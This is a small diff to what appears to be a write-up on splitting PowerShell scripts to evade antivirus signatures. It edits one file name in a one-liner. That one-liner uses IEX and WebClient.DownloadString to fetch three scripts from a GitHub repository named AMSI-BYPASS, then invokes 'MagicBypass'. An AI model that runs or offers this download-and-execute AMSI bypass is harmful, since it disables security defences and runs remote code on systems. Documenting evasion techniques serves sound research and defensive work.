@@ -19,7 +19,7 @@ Attackers can still leverage the same technique and bypass AV by avoiding signat
 They split the script into multiple smaller files (e.g., hello1.ps1, hello2.ps1, and hello3.ps1) and then call them sequentially in a single command:
 
 ```powershell
-IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello1.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello2.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello3.ps1"); MagicBypass;
+IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello2.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello3.ps1"); MagicBypass;
 
 ```
 
